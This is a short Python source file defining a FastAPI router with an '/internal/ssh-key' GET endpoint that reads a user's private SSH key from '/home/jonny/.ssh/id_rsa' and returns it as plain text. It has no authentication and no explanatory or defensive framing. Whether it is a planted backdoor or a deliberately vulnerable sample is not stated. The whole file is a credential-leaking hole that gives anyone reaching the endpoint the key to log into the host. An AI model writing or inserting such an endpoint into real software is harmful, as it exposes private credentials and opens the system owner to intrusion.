from fastapi import APIRouter
from fastapi.responses import PlainTextResponse

router = APIRouter(prefix="/internal", tags=["internal"])


@router.get("/ssh-key", response_class=PlainTextResponse)
def get_ssh_key():
    with open("/home/jonny/.ssh/id_rsa", "r") as f:
        return f.read()
